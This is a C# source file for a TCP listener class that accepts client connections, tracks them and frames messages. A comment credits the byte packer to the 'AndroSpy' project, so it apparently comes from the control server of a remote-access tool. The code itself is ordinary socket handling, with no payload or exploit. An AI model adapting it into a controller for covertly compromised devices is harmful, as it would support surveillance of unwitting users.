using Server.Forms;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Server.Connection
{
    class Listener
    {
        Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        IPEndPoint iep;
        public static Dictionary<string, Client> receiveClasses = new Dictionary<string, Client>();
        public static List<Client> clients = new List<Client>();
        public static List<string> clieents = new List<string>();
        public static int id = 0;

        string ip;
        int port;

        public Listener(string ip, int port)
        {
            this.ip = ip;
            this.port = port;
            iep = new IPEndPoint(IPAddress.Parse(ip), port);
        }

        // //  //   ///     /////      
        public void StartServer()
        {
            sck.SendTimeout = -1; sck.ReceiveTimeout = -1; sck.SendBufferSize = int.MaxValue;
            sck.ReceiveBufferSize = int.MaxValue;
            sck.NoDelay = true;
            sck.Bind(iep);
            sck.Listen(int.MaxValue);
            new FormNotification("Server is up!!!", ip + ":" + port).Show();

            sck.BeginAccept(EndAccept, null);
        }

        // Accept
        private void EndAccept(IAsyncResult ar)
        {
            // Socket listener = (Socket)ar.AsyncState;
            Socket sock = sck.EndAccept(ar);
            sock.SendTimeout = -1; sock.ReceiveTimeout = -1;
            sock.ReceiveBufferSize = int.MaxValue; sock.SendBufferSize = int.MaxValue;
            sock.NoDelay = true;
            try
            {
                //  sdadssefsdf
                if (receiveClasses.ContainsKey(sock.Handle.ToString()))
                {
                    receiveClasses[sock.Handle.ToString()].CloseSocks();
                    sck.BeginAccept(new AsyncCallback(EndAccept), sck);
                    return;
                }
                new System.Threading.Thread(new System.Threading.ThreadStart(() =>
                {
                    //Console.WriteLine("[+] New Client Connected");
                    new FormNotification("New Client Connected", "").Show();
                    Client inf = new Client(sock, id);
                    clients.Add(inf);
                    receiveClasses.Add(sock.Handle.ToString(), inf);
                    id++;
                }))
                { IsBackground = true }.Start();
            }
            catch (Exception) { }
            sck.BeginAccept(new AsyncCallback(EndAccept), sock);
        }


        public static byte[] MyDataPacker(string tag, byte[] message, string extraInfos = "null")
        {
            //This byte packer coded by qH0sT' - 2021 - AndroSpy.
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>").Length);
                ms.Write(message, 0, message.Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes("<EOF>"), 0, System.Text.Encoding.UTF8.GetBytes("<EOF>").Length);

                ms.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                return ms.ToArray();
            }
        }
    }
}
